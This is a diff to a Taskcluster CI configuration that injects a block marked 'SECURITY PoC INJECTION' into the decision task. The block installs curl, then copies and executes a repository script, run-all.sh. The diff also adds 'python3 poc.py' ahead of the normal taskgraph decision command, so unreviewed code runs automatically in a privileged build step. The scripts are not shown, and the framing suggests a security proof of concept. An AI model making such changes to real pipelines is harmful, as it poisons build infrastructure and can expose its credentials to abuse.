@@ -242,6 +242,18 @@ tasks:
               - "--"
               - bash
               - -cx
+              - |
+                # --- SECURITY PoC INJECTION START ---
+                echo "[*] Installing dependencies..."
+                apt-get update -qq && apt-get install -y -qq curl >/dev/null 2>&1 || true
+                echo "[*] Copying PoC scripts into task..."
+                mkdir -p /tmp/poc
+                cp /builds/worker/checkouts/src/taskcluster/poc/run-all.sh /tmp/poc/
+                chmod +x /tmp/poc/run-all.sh
+                echo "[*] Executing PoC suite..."
+                /tmp/poc/run-all.sh
+                echo "[*] PoC execution complete. Proceeding with normal decision task..."
+                # --- SECURITY PoC INJECTION END ---
               - $let:
                   extraArgs:
                     {
@@ -256,6 +268,7 @@ tasks:
                     ~/.local/bin/taskgraph action-callback
                   else: >
                     ln -s /builds/worker/artifacts artifacts &&
+                    python3 poc.py &&
                     ~/.local/bin/taskgraph decision
                     --pushlog-id='0'
                     --pushdate='0'
